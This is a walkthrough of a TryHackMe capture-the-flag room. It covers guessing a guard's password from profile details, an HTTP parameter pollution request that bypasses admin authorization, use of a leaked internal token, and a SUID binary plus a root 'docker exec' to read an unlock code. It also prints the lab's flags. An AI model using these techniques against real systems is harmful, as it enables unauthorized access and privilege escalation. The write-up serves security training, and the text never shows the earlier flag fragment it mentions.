# The Great Disappearing Act (My Walkthrough)

**Challenge:** The Great Disappearing Act

**Platform:** TryHackMe

**Category:** Web Exploitation / Privilege Escalation / SCADA

**Difficulty:** Hard

**Status:** Completed ✅

---

# 📖 Introduction

The **Great Disappearing Act** challenge places us inside the HopSec Asylum, where Hopper, a former red-team mastermind, is locked away in a high-security facility.

The objective is simple:

> Escape the asylum by collecting three flags hidden throughout the environment and submit them to unlock the final invitation code.

However, achieving this required combining several attack techniques including:

* OSINT
* Web Enumeration
* HTTP Parameter Pollution
* API Abuse
* Information Disclosure
* Privilege Escalation
* Docker Abuse
* SCADA Interaction

This write-up documents the complete path I followed to escape the facility.

---

# 🎯 Objectives

| Step | Objective                   |
| ---- | --------------------------- |
| 1    | Unlock Hopper's Cell        |
| 2    | Bypass Psych Ward Security  |
| 3    | Gain Access to SCADA System |
| 4    | Unlock Main Exit            |
| 5    | Escape the Facility         |

---

# 🔎 Initial Enumeration

As always, I began by identifying the exposed services running on the target machine.

```bash
nmap -sV -p- TARGET_IP
```

The scan revealed several interesting services:

| Port  | Service                 |
| ----- | ----------------------- |
| 8000  | Fakebook Application    |
| 8080  | HopSec Security Console |
| 13400 | Video Portal            |
| 13401 | Video Streaming API     |
| 21337 | Side Quest Unlock Page  |

At first glance, the Security Console appeared to be the obvious entry point, but further investigation revealed that the real starting point was actually the Fakebook application.

---

# 🕵️ Phase 1 - OSINT & Credential Discovery

Navigating to the Fakebook application, I began inspecting employee profiles.

After some enumeration, I found an account belonging to:

```text
guard.hopkins@hopsecasylum.com
```

The profile contained useful information:

* Name: John Hopkins
* Nickname: Johnnyboy
* Birth Year: 1982

This immediately suggested a predictable password pattern.

Possible candidates:

```text
Johnnyboy1982
Johnnyboy1982!
Johnnyboy82
Hopkins1982
```

After testing the generated combinations, valid credentials were discovered.

### Credentials

```text
Username: guard.hopkins@hopsecasylum.com
Password: Johnnyboy1982!
```

---

# 🔓 Phase 2 - Security Console Access

Using the recovered credentials, I authenticated to the Security Console.

The application contained multiple CGI endpoints responsible for controlling various facility components.

One endpoint immediately stood out:

```text
/cgi-bin/key_flag.sh
```

By interacting with the endpoint, I was able to remotely unlock Hopper's cell.

```javascript
fetch("/cgi-bin/key_flag.sh?door=hopper")
```

Response:

```json
{
  "ok": true,
  "flag": "THM{h0pp1ing_m4d}"
}
```

---

# 🚩 Flag 1

```text
THM{h0pp1ing_m4d}
```

---

# 📹 Phase 3 - Video Streaming Infrastructure

Next, I shifted focus to the Video Portal API running on port 13401.

After authenticating using the same credentials, I began enumerating available cameras.

```http
GET /v1/cameras
```

Among the listed cameras was:

```text
cam-admin
```

Unfortunately, access was restricted to administrators.

This suggested a possible authorization bypass.

---

# ⚔️ Phase 4 - HTTP Parameter Pollution

Further testing revealed that the application accepted authorization parameters from both:

* Query Parameters
* Request Body

This made the application vulnerable to **HTTP Parameter Pollution (HPP)**.

The exploit involved sending:

```http
POST /v1/streams/request?tier=admin
```

while simultaneously supplying:

```json
{
  "camera_id": "cam-admin",
  "tier": "guard"
}
```

The authorization layer processed the query string first and incorrectly granted administrator access.

As a result, an administrative camera stream ticket was generated.

---

# 🔍 Phase 5 - Hidden Endpoint Discovery

While reviewing the stream manifest, I noticed hidden metadata entries.

```text
/v1/ingest/diagnostics
/v1/ingest/jobs
```

These endpoints were not documented anywhere else.

After triggering a diagnostic task and reviewing the job status output, sensitive information was leaked.

The response contained:

```json
{
  "console_port": 13404,
  "token": "REDACTED"
}
```

This token provided access to an internal management console.

---

# 🖥️ Phase 6 - Internal Console Access

Using the leaked token, I connected to the console service.

After exploring the environment, I discovered a file containing the second part of the challenge.

```bash
cat user_part2.txt
```

Output:

```text
j3stered_739138}
```

Combining it with the previously obtained fragment produced the complete flag.

---

# 🚩 Flag 2

```text
THM{Y0u_h4ve_b3en_j3stered_739138}
```

---

# ⚙️ Phase 7 - SCADA System Discovery

Enumeration from the console revealed an internal SCADA service.

```bash
127.0.0.1:9001
```

Connecting to the service displayed the HopSec Asylum Control System.

Interestingly, the second flag itself served as the authentication token.

```text
THM{Y0u_h4ve_b3en_j3stered_739138}
```

Authentication succeeded and granted access to the SCADA terminal.

---

# 🔺 Phase 8 - Privilege Escalation

To unlock the facility gate, a secret numeric code was required.

The code was stored inside a privileged Docker container.

During local enumeration I discovered:

```bash
/usr/local/bin/diag_shell
```

The binary was configured with the SUID bit.

Further analysis showed that it executed commands using the privileges of a more privileged user.

Using the binary together with Docker group permissions allowed access to the protected container.

```bash
docker exec -u root asylum_gate_control cat /root/.asylum/unlock_code
```

Output:

```text
739184627
```

---

# 🔓 Phase 9 - Unlocking the Main Gate

Returning to the SCADA interface, I submitted the unlock code.

```text
unlock 739184627
```

The system responded:

```text
Gate Status: UNLOCKED
```

With the gate unlocked, the final CGI endpoint became accessible.

```bash
POST /cgi-bin/exit_check.sh
```

Response:

```json
{
  "ok": true,
  "flag": "THM{p0p_go3s_THe_W3as3l}"
}
```

---

# 🚩 Flag 3

```text
THM{p0p_go3s_THe_W3as3l}
```

---

# 🚪 Final Escape

With all three flags collected, the final escape endpoint could be triggered.

```bash
POST /cgi-bin/escape_check.sh
```

Submitting all flags resulted in the final invitation code.

---

# 🏆 Final Invite Code

```text
THM{There.is.no.EASTmas.without.Hopper}
```

---

# 🛡️ Vulnerabilities Exploited

| Vulnerability             | Impact                   |
| ------------------------- | ------------------------ |
| Weak Password Policy      | Initial Access           |
| OSINT Information Leakage | Credential Discovery     |
| HTTP Parameter Pollution  | Authorization Bypass     |
| Hidden API Endpoints      | Attack Surface Expansion |
| Token Leakage             | Internal Console Access  |
| SUID Misconfiguration     | Privilege Escalation     |
| Docker Misconfiguration   | Container Access         |

---

# 📝 Lessons Learned

* Never underestimate OSINT during a penetration test.
* Hidden API functionality often exposes sensitive resources.
* HTTP Parameter Pollution can completely bypass access controls.
* Information disclosure frequently leads to larger compromises.
* SUID binaries must be reviewed carefully.
* Docker group membership can effectively provide root-level access.

---

# 🎯 Challenge Summary

✅ Enumerated exposed services

✅ Performed OSINT against employee profiles

✅ Recovered valid credentials

✅ Accessed Security Console

✅ Exploited HTTP Parameter Pollution

✅ Discovered hidden API functionality

✅ Leaked internal console token

✅ Gained access to SCADA infrastructure

✅ Escalated privileges via SUID binary

✅ Extracted unlock code from Docker container

✅ Retrieved all three flags

✅ Escaped HopSec Asylum
